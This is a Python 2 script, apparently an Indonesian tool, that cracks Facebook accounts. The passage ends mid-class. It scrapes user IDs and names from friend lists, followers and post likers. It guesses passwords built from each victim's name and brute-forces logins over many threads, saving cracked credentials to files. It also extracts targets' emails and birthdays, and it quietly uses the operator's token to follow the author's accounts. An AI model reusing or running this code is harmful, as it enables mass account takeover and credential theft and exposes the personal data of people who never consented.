#!/usr/bin/python2
#-*-coding:utf-8-*-
#Created By Dapunta
#Thanks To My Teacher Who Has Perfected This Script (Angga Kurniawan & Muh Rizal Fiansyah)
#Lu Mau Recode, Mau Lu Apain Terserah Bro, Tapi Hargai Lah Karya Gua.
#Gw Bikin Ni SC Susah Payah, Ngerakit Sana Sini Banyak Error, Jgn Seenaknya Ganti Nama Author, Apalagi Ngalihin Botnya. Terima Kasih.

import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### HEADERS ###

def banner():
    print("""   ___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute  ┌──────────────────────────────┐\n/_/  /_/__\__/(_) Force 2.0  │  Script By Dapunta Khurayra  │\n       /  ^ \/ / // /  ^ \   │   •• Github.com/Dapunta ••   │\n      /_/_/_/_/\_,_/_/_/_/   └──────────────────────────────┘""")

host="https://mbasic.facebook.com"
ua="Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country_name"].lower()
except:
	ips=None
uas=None
if os.path.exists(".browser"):
	if os.path.getsize(".browser") !=0:
		uas=open(".browser").read().strip()

mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
m_fbh={"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":uas,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")

### LOGIN METHODE ###

def logs():
  os.system("clear")
  banner()
  print(k+"\n["+p+"1"+k+"]"+p+" Login Token")
  print(k+"["+p+"2"+k+"]"+p+" Login Cookies")
  print(k+"["+p+"3"+k+"]"+p+" Update Script")
  print(k+"["+p+"4"+k+"]"+p+" Report Bug")
  print(k+"["+p+"0"+k+"]"+p+" Exit")
  sek=raw_input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
    print(k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct")
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    updatesc()
  elif sek=="4":
    wangsaff()
  elif sek=="0":
    exit()
  else:
    print(k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct")
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = raw_input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print(k+"\n["+p+"•"+k+"]"+p+" Login Successful")
        bot_follow()
    except KeyError:
        print (k+"["+p+"!"+k+"]"+p+" Token Invalid")
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = raw_input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print (k+"["+p+"!"+k+"]"+p+" No Connection")
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print(k+"\n["+p+"•"+k+"]"+p+" Login Successful")
        bot_follow()
        
def bot_follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(k+"\n["+p+"!"+k+"]"+p+" Token Invalid")
		logs()
    	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      #Dapunta Khurayra X
    	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      #Anthonyus Immanuel
    	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) #Abigaille Dirgantara
    	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       #Boirah
    	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) #Anita Zuliatin
    	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) #Dapunta Xayonara
        requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) #Muh Rizal Fiansyah
        requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) #Rizal F
        requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) #Angga Kurniawan
    	menu()

### MAIN MENU ###

def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print (k+"["+p+"•"+k+"]"+p+" Error : %s"%e)
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print(k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p)
    print(k+"\n["+p+"•"+k+"]"+p+" Your ID : "+id)
    print(k+"["+p+"•"+k+"]"+p+" Your IP : "+ip)
    print(k+"["+p+"•"+k+"]"+p+" Status  : "+h+"Premium"+p)
    print(k+"["+p+"•"+k+"]"+p+" Joined  : "+durasi)
    print(k+"\n["+p+"1"+k+"]"+p+" Dump ID From Public/Friend")
    print(k+"["+p+"2"+k+"]"+p+" Dump ID From Followers")
    print(k+"["+p+"3"+k+"]"+p+" Dump ID From Likers Post")
    print(k+"["+p+"4"+k+"]"+p+" Dump ID By Name")
    print(k+"["+p+"5"+k+"]"+p+" Start Crack")
    print(k+"["+p+"6"+k+"]"+p+" Get Data Target")
    print(k+"["+p+"7"+k+"]"+p+" Crack By Phone Number")
    print(k+"["+p+"8"+k+"]"+p+" Crack By Email")
    print(k+"["+p+"9"+k+"]"+p+" Result Crack")
    print(k+"["+p+"0"+k+"]"+p+" Logout")
    choose_menu()
	
def choose_menu():
    r=raw_input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
    if r=="":
	print(k+"["+p+"!"+k+"]"+p+" Fill In The Correct")
	menu()
    elif r=="1":
	publik()
    elif r=="2":
	follow()
    elif r=="3":
	likers()
    elif r=="4":
	search_name()
    elif r=="5":
	pilihcrack()
    elif r=="6":
	target()
    elif r=="7":
	phone()
    elif r=="8":
	email()
    elif r=="9":
	ress()
    elif r=="0":
        try:
            jalan(k+"\n["+p+"•"+k+"]"+p+" Thanks For Using My Script")
            os.system("rm -rf login.txt")
            exit()
        except Exception as e:
            print(k+"["+p+"!"+k+"]"+p+" Error %s"%e)
    else:
        print (k+"["+p+"!"+k+"]"+p+" Wrong Input")
        menu()	

def useragent():
    uz = raw_input(k+"\n["+p+"•"+k+"]"+p+" Use Default/Manual User Agent? [d/m] : ")
    if uz=="":
        print(k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct")
        menu()
    elif uz=="d":
        try:
            ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    elif uz=="m":
        try:
            ua = raw_input(k+"["+p+"•"+k+"]"+p+" User Agent : ")
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    else:
        print(k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct")
        menu()

def pilihcrack():
  print (k+"\n["+p+"1"+k+"]"+p+" Crack Api (Fast Crack)")
  print (k+"["+p+"2"+k+"]"+p+" Crack Api (Fast Crack With TTL)")
  print (k+"["+p+"3"+k+"]"+p+" Crack Mbasic (Low Crack)")
  print (k+"["+p+"4"+k+"]"+p+" Crack Mbasic (Low Crack With TTL)")
  print (k+"["+p+"5"+k+"]"+p+" Crack M Facebook (Super Low Crack)")
  krah=raw_input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if krah in[""]:
    print(k+"["+p+"!"+k+"]"+p+" Fill In The Correct")
    pilihcrack()
  elif krah in["1","01"]:
    bapi()
  elif krah in["2","02"]:
    bapittl()
  elif krah in["3","03"]:
    crack()
  elif krah in["4","04"]:
    crackttl()
  elif krah in["5","05"]:
    crackmfb()
  else:
    print(k+"["+p+"!"+k+"]"+p+" Fill In The Correct")
    pilihcrack()

### DUMP ID ###

def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid")
		os.system("rm -rf login.txt")
		logs()
	try:
                os.system("clear")
                banner()
		print(k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist")
		idt = raw_input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(k+"["+p+"•"+k+"]"+p+" Name : "+op["name"])
                        print(k+"["+p+"•"+k+"]"+p+" Getting ID | Please Wait ...")
		except KeyError:
			print(k+"["+p+"!"+k+"]"+p+" ID Not Found")
			print(k+"\n[ "+p+"Back"+k+" ]"+p)
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(k+"\n["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id)))
                jalan(k+"["+p+"•"+k+"]"+p+" Success Dump ID")
		print(k+"["+p+"•"+k+"]"+p+" Copy The Output 👉 "+k+"[ "+h+qq+k+" ]"+p)
		raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
		menu()	
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid")
		os.system("rm -rf login.txt")
		logs()
	try:
                os.system("clear")
                banner()
		idt = raw_input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(k+"["+p+"•"+k+"]"+p+" Name : "+op["name"])
                        print(k+"["+p+"•"+k+"]"+p+" Getting ID | Please Wait ...")
		except KeyError:
			print(k+"["+p+"!"+k+"]"+p+" ID Not Found")
			print(k+"\n[ "+p+"Back"+k+" ]"+p)
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(k+"\n["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id)))
                jalan(k+"["+p+"•"+k+"]"+p+" Success Dump ID")
		print(k+"["+p+"•"+k+"]"+p+" Copy The Output 👉 "+k+"[ "+h+qq+k+" ]"+p)
		raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
		menu()
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid")
		os.system("rm -rf login.txt")
		logs()
	try:
                os.system("clear")
                banner()
		idt = raw_input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(k+"["+p+"•"+k+"]"+p+" Name : "+op["name"])
                        print(k+"["+p+"•"+k+"]"+p+" Getting ID | Please Wait ...")
		except KeyError:
			print(k+"["+p+"!"+k+"]"+p+" ID Not Found")
			print(k+"\n[ "+p+"Back"+k+" ]"+p)
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(k+"\n["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id)))
                jalan(k+"["+p+"•"+k+"]"+p+" Success Dump ID")
		print(k+"["+p+"•"+k+"]"+p+" Copy The Output 👉 "+k+"[ "+h+qq+k+" ]"+p)
		raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
		menu()
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def search_name():
    os.system("clear")
    banner()
    print(k+"\n["+p+"•"+k+"]"+p+" This Feature Is Not Available Right Now")
    print(k+"["+p+"•"+k+"]"+p+" Please Wait Until Coming Soon")
    raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

### CRACK EMAIL & PHONE ###

def phone():
    os.system("clear")
    banner()
    print(k+"\n["+p+"•"+k+"]"+p+" This Feature Is Not Available Right Now")
    print(k+"["+p+"•"+k+"]"+p+" Please Wait Until Coming Soon")
    raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()

def email():
    os.system("clear")
    banner()
    print(k+"\n["+p+"•"+k+"]"+p+" This Feature Is Not Available Right Now")
    print(k+"["+p+"•"+k+"]"+p+" Please Wait Until Coming Soon")
    raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()
    
### INFO ACCOUNT ###

def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(k+"\n["+p+"!"+k+"]"+p+" Token Invalid")
		os.system("rm -rf login.txt")
		login()
	try:
		idt = raw_input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"])
			print(k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"])
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print(k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"])
			except KeyError:
				print(k+"["+p+"•"+k+"]"+p+" Email            : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print(k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"])
			except KeyError:
				print(k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print(k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"])
			except KeyError:
				print(k+"["+p+"•"+k+"]"+p+" Gender           : -")
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print(k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id)))
			except KeyError:
				print(k+"["+p+"•"+k+"]"+p+" Total Friend     : -")
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print(k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id)))
			except KeyError:
				print(k+"["+p+"•"+k+"]"+p+" Total Follower   : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print(k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"])
			except KeyError:
				print(k+"["+p+"•"+k+"]"+p+" Website          : -")
			except IOError:
				print(k+"["+p+"•"+k+"]"+p+" Website          : -")
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print(k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"])
			except KeyError:
				print(k+"["+p+"•"+k+"]"+p+" Update Time      : -")
			except IOError:
				print(k+"["+p+"•"+k+"]"+p+" Update Time      : -")
			raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
		except KeyError:
			raw_input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
	except Exception as e:
		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)

### PASSWORD ###

def generate(text):
    results=[]
    global ips
    for i in text.split(" "):
        if len(i)<2:
            continue
        else:
            i=i.lower()
            if len(i)==2 or len(i)==3 or len(i)==4 or len(i)==5:
                results.append(i+"123")
                results.append(i+"12345")
            else:
                results.append(i)
                results.append(i+"123")
                results.append(i+"1234")
                results.append(i+"12345")
    return results

### BRUTE CRACK ###

def mbasic(em,pas,hosts):
	global ua,mbasic_h
	r=requests.Session()
	r.headers.update(mbasic_h)
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def m_fb(em,pas,hosts):
	global ua,m_fbh
	r=requests.Session()
	r.headers.update(m_fbh)
	p=r.get("https://m.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://m.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in r.cookies.get_dict().keys():
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in r.cookies.get_dict().keys():
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

class crack:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]")
		while True:
			f=raw_input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print (k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
				print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n\x1b[0;37m[•] Finished")
				results(self.ada,self.cp)
                                exit()
				break
	def pwlist(self):
		self.pw=raw_input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			results(self.ada,self.cp)
			print("\n\x1b[0;37m[•] Finished")
                        exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					print("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s               "%(fl.get("id"),i))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

class crackttl:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]")
		while True:
			f=raw_input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print (k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print ("   %s"%e)
				print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				print("\n\x1b[0;37m[•] Finished")
				results(self.ada,self.cp)
                                exit()
				break
	def pwlist(self):
		self.pw=raw_input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print(k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n")
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			results(self.ada,self.cp)
			print("\n\x1b[0;37m[•] Finished")
                        exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s • %s               "%(fl.get("id"),i))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				else:continue
					
			self.ko+=1
			print "\r\x1b[0;37m[Crack] %s/%s | OK : %s | CP : %s"%(self.ko,len(self.fl),len(self.ada),len(self.cp)),;sys.stdout.flush()
		except:
			self.main(fl)

class crackmfb:
        os.system("clear")
        banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print(k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]")
		while True:
			f=raw_input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print ("   %s"%e)
					continue
				print (k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456")
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=raw_input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print ("   %s"%e)
							continue
